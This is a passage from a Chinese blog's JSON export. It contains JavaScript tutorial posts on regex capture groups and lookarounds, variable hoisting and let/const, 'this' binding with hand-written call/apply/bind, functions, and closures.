什么是分组如果需要对多个字符进行重复，此时我们就要用到分组，我们可以使用小括号（）来指定要重复的子表达式，然后对这个子表达式进行重复，例如：(abc)? 表示0个或1个abc 这里一 个括号的表达式就表示一个分组分组可以分为两种形式，捕获组和非捕获组。 捕获组捕获组可以通过从左到右计算其开括号来编号 。例如，在表达式(A)(B( C )) 中，存在四个这样的组：123456let reg = /(\\d&#123;2&#125;).(\\d&#123;2&#125;).(\\d&#123;4&#125;)/;let originString = '02.08.2020';reg.test(originString); //trueRegExp.$1; //02RegExp.$2; //08RegExp.$2; //2020在上面这个例子里，我们有三组括号，形成了三个捕获组，正则表达式（在javaScript里就是我们的RegExp）会缓存捕获组所匹配的串，以$n表示，n就代表这第几个捕获组。 我们知道String的replace()方法经常和正则表达式一起使用。在replace()方法里，我们可以直接使用捕获组的结果：将上面的栗子中02.08.2020改为2020-02-08 1234let reg = /(\\d&#123;2&#125;).(\\d&#123;2&#125;).(\\d&#123;4&#125;)/;let originString = '02.08.2020';let newString = originString.replace(reg, '$3-$1-$2');console.log(newString);//\"2020-02-08\" ( ? : ) 非捕获组有的时候我们可能只想匹配分组，但是并不想缓存（不想捕获）匹配到的结果，就可以在我们的分组模式前面加上?:。例如上面的时间的例子，我们不想捕获第一个分组的结果，就可以这么做： 123456let reg = /(?:\\d&#123;2&#125;).(\\d&#123;2&#125;).(\\d&#123;4&#125;)/;let originString = '02.08.2020';reg.test(originString); //trueRegExp.$1; //02RegExp.$2; //2020originString.match(reg);// [\"10.25.2017\", \"25\", \"2017\", index: 0, input: \"10.25.2017\", groups: undefined 此时RegExp.$1不是数字02，而是08 注意：组0始终代表整个表达式 (?=) positive lookahead 正向前瞻型捕获现在有一个字符串： 1 apple costs 10$ ，现需要捕获美元符号之前的价格，但不能匹配到句子开头的1，这个时候就需要用到正向前瞻性捕获 12345let reg = /\\d+(?=$)/g;let reg1 = /\\d+/g;let str = '1 apple costs 10$';str.match(reg); //[\"10\"]str.match(reg1); //[\"1\", \"10\"] 通俗来说，正向前瞻性匹配x( ? = y)就是匹配x，要求是x后面必须跟着y (?!) negative lookahead 负向前瞻型捕获了解了正向前瞻性捕获，负向前瞻性捕获也就很好理解，/x(?!y)/ 匹配x, 但是必须当x的后面不是y的情况下。直接上个例子： 123let reg = /\\d+(?!€)/g;let str = '1 apple costs 2€';str.match(reg); ['1'] (?&lt;=) positive lookbehind 正向后顾型捕获后顾型和前瞻型正好相反，意思就是：/(?&lt;=y)x/ 匹配x, 但是只在【前面】【有】y的情况下来看一个例子： 12let str = \"1 turkey costs $2\";console.log( str.match(/(?&lt;=\\$)\\d+/g) ); //[\"2\"] (?&lt;!) negative lookbehind 负向后顾型捕获负向就是与正向相反，那么负向后顾型捕获就是：/(?&lt;=y)x/ 匹配x, 但是只在【前面】【没有】y的情况下来看一个例子：12let str = \"1 turkey costs $2\";console.log( str.match(/(?&lt;!\\$)\\d+/g) ); //['1'] 一些其他情况默认情况下上面的前瞻后顾4种都是默认不匹配捕获组里面的内容的，也就是不匹配括号里的条件的。例如我们的正向前瞻/d+(?=€)/g，只会匹配到数字，并不会匹配到€。如果我们想要也匹配到€怎么办呢？答案就是给€也包上一个括号： 123456789//前瞻型let str = \"1 turkey costs 2€\";let reg = /\\d+(?=(€))/; str.match(reg); //[\"2\", \"€\", index: 15, input: \"1 turkey costs 2€\", groups: undefined]//后顾型let str = \"1 turkey costs $2\";let reg = /(?&lt;=(\\$|£))\\d+/;console.log( str.match(reg) ); //[\"2\", \"$\", index: 16, input: \"1 turkey costs $2\", groups: undefined] 正则的一些特性 贪婪性 所谓的贪婪性就是正则在捕获时，每一次会尽可能多的去捕获符合条件的内容。如果我们想尽可能的少的去捕获符合条件的字符串的话，可以在量词元字符后加? 懒惰型 懒惰性则是正则在成功捕获一次后不管后边的字符串有没有符合条件的都不再捕获。如果想捕获目标中所有符合条件的字符串的话，我们可以用标识符g来标明是全局捕获 一些正则常用的方法reg.test()用来验证字符串是否符合正则 符合返回true 否则返回false 123var str = 'abc';var reg = /\\w+/;console.log(reg.test(str)); //true reg.exec() 用来捕获符合规则的字符串当我们用exec进行捕获时，如果正则没有加’g’标识符，则exec捕获的每次都是同一个，当正则中有’g’标识符时 捕获的结果就不一样了12345678910111213141516171819202122232425262728293031323334353637383940//没有gvar str = 'abc123cba456aaa789';var reg = /\\d+/;console.log(reg.exec(str))// [\"123\", index: 3, input: \"abc123cba456aaa789\"];console.log(reg.lastIndex)// lastIndex : 0 reg.exec捕获的数组中 // [0:\"123\",index:3,input:\"abc123cba456aaa789\"]0:\"123\" 表示我们捕获到的字符串index:3 表示捕获开始位置的索引input 表示原有的字符串//有gvar str = 'abc123cba456aaa789';var reg = /\\d+/g; //此时加了标识符gconsole.log(reg.lastIndex)// lastIndex : 0 console.log(reg.exec(str))// [\"123\", index: 3, input: \"abc123cba456aaa789\"]console.log(reg.lastIndex)// lastIndex : 6console.log(reg.exec(str))// [\"456\", index: 9, input: \"abc123cba456aaa789\"]console.log(reg.lastIndex)// lastIndex : 12console.log(reg.exec(str))// [\"789\", index: 15, input: \"abc123cba456aaa789\"]console.log(reg.lastIndex)// lastIndex : 18console.log(reg.exec(str))// nullconsole.log(reg.lastIndex)// lastIndex : 0每次调用exec方法时,捕获到的字符串都不相同lastIndex ：这个属性记录的就是下一次捕获从哪个索引开始。当未开始捕获时，这个值为0。如果当前次捕获结果为null。那么lastIndex的值会被修改为0.下次从头开始捕获。而且这个lastIndex属性还支持人为赋值。 exec还受分组的影响 12345var str = '2017-01-05';var reg = /-(\\d+)/g// [\"-01\", \"01\", index: 4, input: \"2017-01-05\"]\"-01\" : 正则捕获到的内容\"01\" : 捕获到的字符串中的小分组中的内容 str.match(reg) 如果匹配成功，就返回匹配成功的数组，如果匹配不成功，就返回null123456var str = 'abc123cba456aaa789';var reg = /\\d+/;console.log(reg.exec(str));//[\"123\", index: 3, input: \"abc123cba456aaa789\"]console.log(str.match(reg));//[\"123\", index: 3, input: \"abc123cba456aaa789\"] 可以看到，两者的结果是一样的，因为我们没有设置全局匹配，当加了g之后： 123456var str = 'abc123cba456aaa789';var reg = /\\d+/g;console.log(reg.exec(str));// [\"123\", index: 3, input: \"abc123cba456aaa789\"]console.log(str.match(reg));// [\"123\", \"456\", \"789\"] str.replace() —— 正则的好伙伴正则去匹配字符串，匹配成功的字符去替换成新的字符串写法：str.replace(reg,newStr); 1234var str = 'a111bc222de';var res = str.replace(/\\d/g,'Q')console.log(res)// \"aQQQbcQQQde\" replace的第二个参数也可以是一个函数str.replace(reg,fn);这个函数会接收三个参数：模式的匹配项，模式匹配项在字符串中的位置，原始字符串 1234567var str = '2017-01-06';str = str.replace(/-\\d+/g,function()&#123; console.log(arguments)&#125;)/*[\"-01\", 4, \"2017-01-06\"][\"-06\", 7, \"2017-01-06\"]\"2017undefinedundefined\"*/ 如果我们需要替换replace中正则找到的字符串，函数中需要一个返回值去替换正则捕获的内容再来个简单的栗子：捕获url中的参数值 1234567891011(function(pro)&#123; function queryString()&#123; var obj = &#123;&#125;, reg = /([^?&amp;#+]+)=([^?&amp;#+]+)/g; this.replace(reg,function($0,$1,$2)&#123; obj[$1] = $2; &#125;) return obj; &#125; pro.queryString = queryString;&#125;(String.prototype));","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"变量","slug":"变量","date":"2020-01-30T16:00:00.000Z","updated":"2024-05-25T02:28:45.275Z","comments":true,"path":"2020/01/31/变量/","link":"","permalink":"https://wtaufpziv.github.io/2020/01/31/%E5%8F%98%E9%87%8F/","excerpt":"JavaScript变量相关 部分概念和例子来源于《ES6标准入门》——阮一峰以及红宝书《javascript高级程序设计》","text":"JavaScript变量相关 部分概念和例子来源于《ES6标准入门》——阮一峰以及红宝书《javascript高级程序设计》 var带来的变量提升ES5中var带来的变量提升现象可以说是很常见了，所谓变量提升，就是将var a = 123这样的语句，将声明变量提升到其作用域顶端去执行，而将赋值语句留在原地执行 123456789101112function test () &#123; console.log(a); //undefined var a = 123; &#125;;test();//上述代码a的结果是undefined，它的实际执行顺序如下：function test () &#123; var a; console.log(a); a = 123;&#125;test(); 同样的，下面这样写也不会出现错误 123a = 1var aconsole.log(a) //1 函数提升既然提到了变量提升，那就顺带说一说函数提升。我们知道，定义一个函数可以有函数声明和函数表达式。其中，函数表达式中的函数提升规则和变量提升一样，因为就是把匿名函数赋值给一个变量，就是将函数看作一个值。但是函数声明就不一样了，它是将一整个代码块提升到作用域顶端执行。 1234fun(2) //2function fun(a)&#123; console.log(a)&#125; 所以下面这个例子也很容易看懂为什么输出是1 12345678foo(); //1var foo;function foo () &#123; console.log(1);&#125;foo = function () &#123; console.log(2);&#125; 函数会比变量先提升 注意两种提升结合的优先级我们先来看一段代码 1234567var foo = function(x, y)&#123; return x - y;&#125;function foo(x, y)&#123; return x + y;&#125;var num = foo(1, 2); 这段代码中num值最终为-1而不是3。这里对于foo变量先后通过函数声明和函数表达式赋值了两个函数，那么就涉及到这两个东西的优先级，规则如下： 变量声明、函数声明都会被提升到作用域顶处； 当出现相同名称时，优先级为：变量声明(foo#1) &lt; 函数声明(foo#2) &lt; 变量赋值(foo#3) 函数表达式的赋值语句不会被提升 也就是说上述代码实际是这样的： 123456789101112131415//variable hoisting变量提升var foo;//foo#1var num; //function declaration hoisting函数声明提升function foo(x, y)&#123;//foo#2 return x + y;&#125; //function expression NOT hoisted函数表达式不会被提升foo = function(x, y)&#123;//foo#3 return x - y;&#125; num = foo(1, 2);//这里使用foo#3 let命令ES6新增的let 命令，用于声明变量，但其只在命令所在的代码块内有效， 123456&#123; var a = 2 let b = 2&#125;console.log(a)//aconsole.log(b)//a is undefine 回顾函数中关于闭包的内容、 123456789101112function a()&#123; var arr = [] for(var i = 1; i &lt; 10; i++)&#123; arr[i] = function()&#123; console.log(i) &#125; &#125; return arr&#125;var f = a()f[1]()//10f[2]()//10 如果使用let，声明的变量仅在for循环内有效，则可以正常输出 123456789101112function a()&#123; var arr = [] for(let i = 1; i &lt; 10; i++)&#123; arr[i] = function()&#123; console.log(i) &#125; &#125; return arr&#125;var f = a()f[1]()//1f[2]()//2 不存在变量提升对于var命令的变量提升，多多少少会有一些奇怪，为了纠正这种现象，let命令改变了这种语法行为，它所声明的变量一定要在声明之后使用，否则便会报错 123console.log(a)let a = 1//报错 暂时性死区只要块级作用域内存在let声明的变量，它所声明的变量就绑定在了这个区域，不会受到外部的影响 12345var a = 1if(true)&#123; a = 2 //报错 let a&#125; 上述代码存在全局变量a，但是块级作用域内又用let声明了一个局部变量a，导致后者绑定了这个区域，所以在a声明前给其赋值发生了报错因此，所谓暂时性死区，是指使用let命令声明变量前，该变量不可使用，这在语法上就称为暂时性死区（TDZ） 123456789if(true)&#123;//TDZ开始 a = 1//报错 console.log(a)//报错 let a //TDZ结束 a = 2 console.log(a)//2&#125; 在暂时性死区中，typeof不再是一个安全的操作符 12typeof x//报错let x 上述代码中，变量x在暂时性死区当中使用，所以报了错，但是要注意，如果没有暂时性死区，一个变量直接不被声明，typeof操作符反而不会报错 1typeof x//undefine 因此，在不用let命令时，typeof操作符是一个绝对安全的操作符。现在es6改变了这一点，所以需要在实际编程中养成良好的编程习惯 一些比较隐蔽的暂时性死区： 12345678function a(x = y, y = 2)&#123; return &#123;x, y&#125;&#125;a()//报错//参数x的默认值等于另一个参数y，而此时y并没有声明，属于死区var x = x//不报错let x = x//报错 不允许重复声明变量let不允许在相同的作用域内声明同一个变量 1234function a()&#123; let a = 10 var a = 9&#125;//报错 块级作用域ES5中只有全局作用域和函数作用域，并没有块级作用域的概念，导致一些场景很不合理 1234for(var i = 0; i &lt; 10; i++)&#123; ...&#125;console.log(i) //10 上述代码中，变量i只用来控制循环，但循环结束后，他并没有消失，而是泄露成了全局变量。let实际上为JS提供了块级作用域12345678function a()&#123; let n = 5 if(true)&#123; let n = 10 &#125; console.log(n)&#125;a()//5所以，实际上用let构建块级作用域这种方法就可以替代使用匿名函数这种方法 1234567(function()&#123; var a = 9&#125;)()//等同于&#123; let a = 9&#125; 块级作用域与函数声明ES5规定，不能再块级作用域中使用函数声明。如下这种代码在ES5中是非法的，因为没有块级作用域，所以if内部声明的函数有可能被提升到if外面而产生错误 123if(true)&#123; function a()&#123;...&#125;&#125; 由于ES6引入了块级作用域，且明确允许在块级作用域中声明函数，声明出来的函数在块级作用域之外不能使用。需要理解的是，ES6中函数声明的行为是类似于let。来看个例子 1234567891011function a()&#123; console.log('i am outside')&#125;(function()&#123; if(false)&#123; function a()&#123; console.log('i am inside') &#125; &#125; a()&#125;)() 上述代码在ES5环境中会运行i am inside，因为if内部环境对于es5并不是块级作用域，所以if内部的函数被提升到了if的外面。而在ES6环境下执行得到的是i am out side，所以if内部的函数对于外部运行没有任何影响。但是！！！在如今大多数支持ES6的浏览器中运行上述代码依然会报错，是因为如果严格遵守上述规定，会对旧代码产生影响，因此ES6允许浏览器有自己的行为方式，具体如下 允许在块级作用域中声明函数 函数声明类似于var，会被提升到全局作用域或函数作用域的头部 同时，函数声明也会提升到所在块级作用域的头部 综上所述：还是避免在块级作用域中声明函数（晕），所以上述例子在浏览器中，实际是这样的 123456789101112function a()&#123; console.log('i am outside')&#125;(function()&#123; var a = undefine if(false)&#123; function a()&#123; console.log('i am inside') &#125; &#125; a()&#125;)()//报错，a is not a functon const命令基本用法：声明一个常量，一旦声明，其值不再可以改变。 12const PI = 3.14159PI = 3.14//error const和let一样，只在声明所在的块级作用域内有效，也不会产生变量提升，因此也存在暂时性死区,。同时，也不可重复声明 const的本质const实际上并不是保证变量的值不可以改动，而是变量指向的那个内存地址不可以改动。对于JS的引用类型，变量指向的内存地址只是一个指针，换句话说，const只保证变量不指向另一个应用类型的对象，而不保证对象本身的属性不被更改。因此使用const要非常小心。 12345const f = &#123;&#125;f.age = 20f.age//20f = &#123;&#125;//报错","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"this","slug":"this","date":"2020-01-28T16:00:00.000Z","updated":"2024-05-25T02:28:45.258Z","comments":true,"path":"2020/01/29/this/","link":"","permalink":"https://wtaufpziv.github.io/2020/01/29/this/","excerpt":"关于this对象this的概念它代表函数运行时，自动生成的一个内部对象，只能在函数内部使用 —— 阮一峰这句话表明，this只与函数运行时的环境有关，而与初始化时的环境无关","text":"关于this对象this的概念它代表函数运行时，自动生成的一个内部对象，只能在函数内部使用 —— 阮一峰这句话表明，this只与函数运行时的环境有关，而与初始化时的环境无关 四种this的绑定方式默认绑定1234567function a()&#123; console.log(this.bar)&#125;var bar = 'bar1'var o1 = &#123;bar: 'bar2', foo: a&#125;var o2 = &#123;bar: 'bar3', foo: a&#125;a() //'bar1' 默认绑定 隐式绑定12345678function a()&#123; console.log(this.bar)&#125;var bar = 'bar1'var o1 = &#123;bar: 'bar2', foo: a&#125;var o2 = &#123;bar: 'bar3', foo: a&#125;o1.foo()//'bar2' 隐式绑定//谁调用，就指向谁 显式绑定如果函数通过call，apply，bind调用，那么这种绑定就称为显式绑定， this指向三个函数当中的参数12345function a()&#123; console.log(this.bar)&#125;var o = &#123;bar: 'hhh'&#125;a.call(o) //'hhh' 显式绑定 关键字new绑定此时this指向new出来的那个对象1234function a()&#123; console.log(this.bar)&#125;var b = new a() //undefine 箭头函数不一样箭头函数无视以上规则，this的值就是函数创建时所在的对象，对比以下两个例子 1234567function Person()&#123; this.age = 10 setTimeout(function()&#123; console.log(this.age) //undefine &#125;,1000)&#125;var p = new Person() 1234567function Person()&#123; this.age = 10 setTimeout(() =&gt; &#123; console.log(this.age) //10 &#125;,1000)&#125;var p = new Person() 上述两个例子中，前者setTimeout内部的函数是global调用的，而global中没有age这一属性。后者使用了箭头函数，this就会绑定在Person上。 绑定优先级1、箭头函数2、关键字new3、显示绑定4、隐式绑定5、默认绑定 bind，apply，call的理解call 和 apply 都是为了解决改变 this 的指向，作用都是相同的，只是传参的方式不同。除了第一个参数外，call 可以接收一个参数列表（就是一个个传参），apply 只接受一个参数数组（把参数组合成为一个数组）。返回值是函数的返回值，若函数无返回值，则返回undefine 12345678910let a = &#123; value: 1&#125;function getValue(name, age) &#123; console.log(name) console.log(age) console.log(this.value)&#125;getValue.call(a, 'yck', '24')getValue.apply(a, ['yck', '24']) bind作用和上面两个一样，传参和call一样，但是返回的是改变了this指向后的函数 分别手动实现call, apply, bind实现的依据与原理很简单：函数的this，谁调用，就指向谁 实现一个call思路：1.、这个函数怎么下手，换句话说，写在哪里call是所有函数自带的属性，我们要自定义一个call，当然是给Function类型添加myCall属性2、函数接收的参数第一个参数是被绑定对象，所以函数参数是第二个接收参数及其之后的参数3、这个this指向怎么改变如果调用者函数，被某一个对象所拥有，那么该函数在调用时，内部的this指向该对象。 1234567891011121314151617Function.prototype.myCall = functon(context)&#123; //获取参数中被绑定的上下文 var ctx = context || window //将当前执行的这个函数作为一个属性加入到上下文中 ctx.fun = this //将第二个及其之后的参数取出来(也可能没有) var args = [...arguments].slice(1) //在上下文环境中执行这个函数，触发隐式绑定，同时保存返回值 var res = ctx.fun(...args) //删除ctx中的fun，避免造成污染 delete ctx.fun return res&#125; 实现一个apply掌握了实现call，那么apply也就依葫芦画瓢了 1234567891011121314151617181920Function.prototype.myApply = functon(context)&#123; //获取参数中被绑定的上下文 var ctx = context || window //将当前执行的这个函数作为一个属性加入到上下文中 ctx.fun = this //判断是否存在第二个参数 var res if(arguments[1])&#123; res = ctx.fun(...arguments[1]) &#125; else&#123; res = ctx.fun() &#125; //删除ctx中的fun，避免造成污染 delete ctx.fun return res&#125; 实现一个bind这个和上述两个不一样，一个是返回值，call和apply返回函数执行结果，而bind返回的是函数。call和apply会立即执行函数，但是bind并不立即执行bind 返回了一个函数，对于函数来说有两种方式调用，一种是直接调用，一种是通过 new 的方式，所以两种方式都要考虑到 对于直接调用来说，这里选择了 apply 的方式实现，但是对于参数需要注意以下情况：因为 bind 可以实现类似这样的代码 f.bind(obj, 1)(2)，所以我们需要将两边的参数拼接起来，于是就有了这样的实现 args.concat(…arguments) 通过 new 的方式。对于 new 的情况来说，不会被任何方式改变 this，所以对于这种情况我们需要忽略传入的 this 1234567891011121314151617Function.prototype.myBind = function (context) &#123; if (typeof this !== 'function') &#123; throw new TypeError('Error') &#125; const self = this const args = [...arguments].slice(1) // 返回一个函数 var fbound = function () &#123; var bindArgs = Array.prototype.slice.call(arguments); // 当作为构造函数时，this 指向实例，self 指向绑定函数，因为原型链被复制，所以此时结果为 true，当结果为 true 的时候，忽略this // 当作为普通函数时，this 指向 window，self 指向绑定函数，此时结果为 false，当结果为 false 的时候，this 指向绑定的 context。 self.apply(this instanceof self ? this : context, args.concat(bindArgs)); &#125; // 复制一下原型链， fbound.prototype = this.prototype; return fbound;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"函数","slug":"函数","date":"2020-01-27T16:00:00.000Z","updated":"2024-05-25T02:28:45.263Z","comments":true,"path":"2020/01/28/函数/","link":"","permalink":"https://wtaufpziv.github.io/2020/01/28/%E5%87%BD%E6%95%B0/","excerpt":"JavaScript中的函数（一些基础知识）","text":"JavaScript中的函数（一些基础知识） 关于JS函数函数是对象，函数名是指针 函数声明与函数表达式12345678//函数声明function sum(a, b)&#123; return a + b;&#125;//函数表达式var sum = function(a, b)&#123; return a + b&#125; 两者的区别：在解析过程中，解析器优先解析函数声明，而函数表达式需要当代码执行到它所在的行才会执行 1234567sum(1, 2)function sum(a, b)&#123;...&#125;//正确sum(1, 2)var sum = function(a, b)&#123;...&#125;//错误 注意：尽量不要在块级作用域中使用函数声明，而用函数表达式代替 123456789if(p) function a()&#123;...&#125;else function b()&#123;...&#125;//不要这样做，而用一下代替if(p) var a = function()&#123;...&#125;else var b = function()&#123;...&#125; 函数的内部属性在函数的内部，有两个特殊的对象：arguments，thisarguments对象有一个 callee 的属性，他是一个指针，指向拥有这个arguments的一个函数 1234function j(num)&#123; if(num &lt;= 1) return num else return j(num - 1)&#125; 这是一个简单的递归，他的缺点是函数内部的递归语句与函数名紧紧地耦合在一起，不利于维护，此时可以利用callee进行修改 1234function j(num)&#123; if(num &lt;= 1) return num else return arguments.callee(num - 1)&#125; this：引用函数的执行环境对象caller：保存着调用当前函数的函数的引用，如果是全局调用，则该值为null 函数的自带属性1、length：函数希望接收的参数个数 12function sum(a, b)&#123;...&#125;sum.length//2 2、apply,call,bind这三者的用法与区别，移步另一篇博客 关于匿名函数1var say = function()&#123;...&#125; 这种情况下创建的函数叫做匿名函数，匿名函数的一些使用场景是把它当做值来使用红宝书上的经典例子： 1234567891011121314function createComparisonFunction(propertyName)&#123; return function(obj1, obj2)&#123; var val1 = obj1[propertyName] var val2 = obj2[propertyName] //接下来是一些比较规则，自定义 if(val1 &lt; val2) return -1 else if(val1 &gt; val2) return 1 else return 0 &#125;&#125;var data = [&#123;name:'c', age: 20&#125;, &#123;name: 'a', age: 30&#125;]data.sort(createComparisonFunction('name'))data[0].name //a 还记得之前所说，sort方法会调用每个对象的toString()方法来进行排序，因此得到的结果往往都不符合预期，而sort可以提供一个函数作为参数，用来定义排序规则。这里就是将createComparisonFunction内部的匿名函数作为值返回之后，再当做参数传递给sort以规定排序的方法。 关于this移步另一篇文章，深入理解this对象 模仿块级作用域JS中并没有块级作用域的概念，例如 123456function a(count)&#123; for(var i = 0; i &lt; count; i++)&#123; ... &#125; console.log(i)&#125; 不同于大多数其他语言，for循环内部定义的变量i， 并不会随着循环结束而被销毁，闭包的知识可以说明这一点，因为这里的i变量保存在了函数a的活动对象内，因此从函数创建开始，就可以在函数内部任意访问它。而匿名函数则可以模仿块级作用域，修改上述代码 12345678function a(count)&#123; (function()&#123; for(var i = 0; i &lt; count; i++)&#123; ... &#125; &#125;)() console.log(i)//报错&#125; 这里定义了一个立即执行的匿名函数，因此匿名函数执行完毕之后i就会被销毁，达到块级作用域的效果 作用：这个技巧通常在全局作用域中被用在函数外部，从而避免向全局作用域添加过多的变量与函数，一般来说，我们都应该尽量少向全局作用域添加变量和函数。 ES6对函数的扩展函数参数默认值es5中，并没与提供直接的函数默认参数值的方法，而在es6中，可以这样使用123456function a(x, y = 'world')&#123; console.log(x, y)&#125;a('hello') //hello worlda('hello', 'javascript')//hello javascripta('hello', '')//hello参数的变量是默认声明的，所以不能使用let和const再次声明 1234function a(x = 5)&#123; let x = 1//报错 const x = 2//报错&#125; 使用参数默认值时，函数不能有同名参数 1234function a(x, x, y = 1)&#123; ...&#125;//SyntaxError 参数默认值不是传值的，而是每次都要重新计算默认表达式的值，也就是说，参数默认值时惰性求值 1234567let x = 99function a(p = x + 1)&#123; console.log(p)&#125;a()//100x = 100a()//101 与解构赋值默认值结合使用1234567function a(&#123;x, y = 5&#125;)&#123; console.log(x, y)&#125;a(&#123;&#125;)//undefine, 5a(&#123;x:1&#125;)//1,5a(&#123;x:1, y:2&#125;)//1, 2a()//报错 上述代码中使用对象的解构赋值设置函数的默认值，只有当函数的参数是一个对象时，变量x和y才会通过解构赋值生成，否则就会报错，以下代码也是这样 12345function a(m, &#123;x = 1&#125;)&#123; console.log(x)&#125;a(6,&#123;&#125;)//1a(6)//报错 也可以通过设置双重默认值来解决这个问题 12345function a(m, &#123;x = 1&#125; = &#123;&#125;)&#123; console.log(x)&#125;a(6,&#123;&#125;)//1a(6)//1 默认参数的位置一般情况下，默认参数应该是函数的尾参数，因为在非尾参数设置默认值，实际上这个参数是无法省略的 123456function a(x = 1, y)&#123; console.log(x, y)&#125;a()//1,undefinea(2)//2, undefinea(,2)//报错 注意此时的length属性指定了默认值后，函数的length属性将返回没有默认值的参数个数 1(function(a, b = 5)&#123;&#125;).length //1 作用域一旦设置了默认值，函数进行声明和初始化时就会形成一个单独的作用域，等到初始化结束，作用域就会消失 123456let x = 1function a(y = x)&#123; let x = 2; console.log(y)&#125;a()//1 上面的代码中， 函数f调用时，参数y = x形成了一个单独的作用域，在这个作用域内变量x本身并没有定义，所以指向外层的全局变量x，函数调用时，内部的局部变量影响不到默认变量x rest参数es6引入了rest参数，用于获取函数的多余参数 12345678function add(x, ...y)&#123; let sum = 0 for(var i of y)&#123; sum += i &#125; return sum&#125;add(1, 2, 3)//6 注意：rest参数后面不可以再跟其他参数，否则会报错 1234function add(x, ...y, z)&#123; ...&#125;//报错 name属性函数的name属性返回函数名，这一属性直到es6才被写入标准需要注意的是，es6对这一属性进行了一些修改，如果将一个匿名函数赋值给变量，es5中name返回空串，而es6返回实际的函数名 12345var f = function()&#123;&#125;;//es5f.name // ''//es6f.name // 'f' 箭头函数 &amp;&amp; 尾调用优化移步另一篇博客","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"闭包","slug":"闭包","date":"2020-01-27T16:00:00.000Z","updated":"2024-05-25T02:28:45.284Z","comments":true,"path":"2020/01/28/闭包/","link":"","permalink":"https://wtaufpziv.github.io/2020/01/28/%E9%97%AD%E5%8C%85/","excerpt":"深入理解javascript的闭包","text":"深入理解javascript的闭包 首先回顾一下作用域链直接上来举个简单的栗子 12345678//windowvar a = 1function aa()&#123; var b = 2 function bb()&#123; var c = 3 &#125;&#125; 这里涉及三个执行环境：全局，函数aa，函数bb。1、全局环境：可访问变量a与函数aa。全局变量对象为{a : 1, aa : (function)}2、函数aa：可访问变量a，变量b，函数bb。aa变量对象为{b : 2, bb : (function), arguments} {a : 1, aa : (function)}3、函数bb：可访问变量a，b，c。bb变量对象为{c : 3, arguments} {b : 2, bb : (function), arguments} {a : 1, aa : (function)} 简单来说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期 红宝书上的概念：当代码在一个环境中执行时，会创建变量对象的一个作用域链。他的作用是保证对执行环境有权访问的所有变量和函数的有序访问。在作用域链中只能向上访问而不能向下访问。若环境是函数，则将其活动对象作为变量对象，活动对象一开始只包含一个arguments对象。其下一个变量对象来自包含环境，再下一个变量对象来自下一个包含环境，这样一直持续到全局环境，形成一个作用域链。 延长作用域链由于有些语句可以在作用域链前端临时增加一个变量对象，该变量对象会在代码执行之后被移除1、try-catch语句的catch块2、with语句123456function a()&#123; with(location)&#123; var url = href + '?name=Tom' &#125; return url&#125;有了这个语句，函数a这个执行环境中的变量对象就包含了location对象及其所有属性，相当于把location对象挂在了作用域链的最前端。with语句中的href实际上是location中的href。而在with内部定义的url变量，也会曾为函数变量对象的一部分 闭包创建闭包最常用的方式，就是在一个函数内部创建另一个函数。简单来说：函数 A 返回了一个函数 B，并且函数 B 中使用了函数 A 的变量，函数 B 就被称为闭包。首先直接来个栗子：123456789function A() &#123; let a = 1 function B() &#123; console.log(a) &#125; return B&#125;var C = A()C() // 1在上述例子中，函数A的活动对象为{arguments, a : 1, B : (function)}，当A()执行之后函数A即被销毁，但是由于B使用到了A的活动对象内容，因此A的活动对象会被保存到内存。函数C执行可以返回正确的内容 但在这种模式下，就会产生js闭包的一个经典问题（闭包循环返回最后一个值的问题），红宝书中这样描述：闭包只能取得包含函数中任何变量的最后一个值。闭包所保存的是整个变量对象，而不是某个特殊的值。红宝书上的两个例子：12345678910111213141516171819202122232425262728293031//例子1function a()&#123; var res = []; for(var i = 0; i &lt; 10; i++)&#123; res[i] = function()&#123; return i &#125; &#125; return res&#125;var c = a()c[0]() //10c[1]()//10...//例子2function a()&#123; var res = []; for(var i = 0; i &lt; 10; i++)&#123; res[i] = (function(num)&#123; return function()&#123; return num//这里保存了不同的num副本 &#125; &#125;)(i) &#125; return res;&#125;var c = a()c[0]//0c[i]]//1...上述两个例子中，区别在于，res[i]=的后面，例子一是直接将闭包赋值给了res，例子二是又创建了一个闭包函数赋值给res。 前者不立即执行，而是当res返回之后手动调用res才执行，这个时候函数a中循环结束，变量对象中保存有i的值为10，所以在之后调用res函数时，无论调用res数组的哪个函数，只会返回10 后者由于是一个立即执行的匿名函数，因此生成的10个匿名函数都会正确得到 i 的值，然后再将这些值依次通过num值传递给内部的闭包函数，并将闭包函数返回。 